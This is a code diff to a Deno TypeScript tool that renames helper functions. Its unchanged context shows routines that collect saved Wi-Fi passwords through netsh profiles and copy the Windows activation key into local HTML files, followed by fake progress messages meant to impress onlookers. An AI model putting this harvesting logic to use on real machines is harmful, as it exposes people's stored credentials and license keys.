@@ -1,4 +1,4 @@
-import { checkDirs, clearTags, createHTML, getNow, rand } from './Functions.ts';
+import { checkDirs, clearTags, getHTML, getNow, random } from './Functions.ts';
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { keypress } from '@cliffy/keypress';
 import { qrcode } from '@qrcode';
@@ -21,8 +21,8 @@ silentMode();
 await checkDirs();
 
 // 'Title.txt' contém uma string bem cringe
-const title: string = await Deno.readTextFile('data/Title.txt')
-	.catch(() => '');
+const title: string = await Deno.readTextFile('data/Title.txt').catch(() => '');
+
 showLogs && console.log(title.text_bold.red);
 
 class Spinner {
@@ -117,7 +117,7 @@ async function NetSHProfileCollector() {
 
 		await Deno.writeTextFile(
 			`data/WiFiPasswords/${SSID[0]}.html`,
-			createHTML(SSID[0], body),
+			getHTML(SSID[0], body),
 		);
 	}
 }
@@ -134,7 +134,7 @@ async function copyWinKey() {
 
 	await Deno.writeTextFile(
 		`data/WindowsKeys/${Deno.hostname()}.html`,
-		createHTML(Deno.hostname(), body),
+		getHTML(Deno.hostname(), body),
 	);
 }
 
@@ -152,22 +152,22 @@ async function createFakeLogs() {
 	// Exibe status fakes pra impressionar leigos
 	for (const msg of fakeLogs) {
 		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
-		await sleep(rand());
+		await sleep(random());
 		spinner.end(msg[1]);
 	}
 
 	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
-	await sleep(rand(1_000, 3_000));
+	await sleep(random(1_000, 3_000));
 	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);
 
 	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
-	await sleep(rand());
+	await sleep(random());
 	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);
 
 	spinner = new Spinner('CLEANER', 'Apagando registros...');
-	await sleep(rand());
+	await sleep(random());
 	spinner.end('Registros excluídos.');
-	await sleep(rand(1_500, 3_000));
+	await sleep(random(1_500, 3_000));
 
 	showLogs && Deno.exit();
 }
